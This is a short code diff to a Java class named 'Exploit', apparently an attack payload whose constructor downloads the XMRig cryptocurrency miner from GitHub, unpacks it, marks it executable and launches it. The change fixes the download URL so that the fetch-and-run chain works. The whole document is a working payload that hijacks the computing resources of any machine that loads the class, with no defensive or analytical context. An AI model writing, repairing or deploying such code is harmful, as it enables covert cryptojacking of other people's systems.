@@ -23,8 +23,8 @@ import java.net.Socket;
 public class Exploit {
 
     public Exploit() throws Exception {
-        Process process = Runtime.getRuntime().exec("wget https://github.com/xmrig/xmrig/releases/xmrig-6.16.4-focal-x64.tar.gz");
-        Process process2 = Runtime.getRuntime().exec("tar -xvf xmrig-6.16.4-focal-x64.tar.gz");
+        Process process = Runtime.getRuntime().exec("wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz");
+        Process process2 = Runtime.getRuntime().exec("tar -xvf xmrig-6.16.4-linux-x64.tar.gz");
         Process process3 = Runtime.getRuntime().exec("chmod +x xmrig-6.16.4/xmrig");
         Process process4 = Runtime.getRuntime().exec("./xmrig-6.16.4/xmrig");
     }
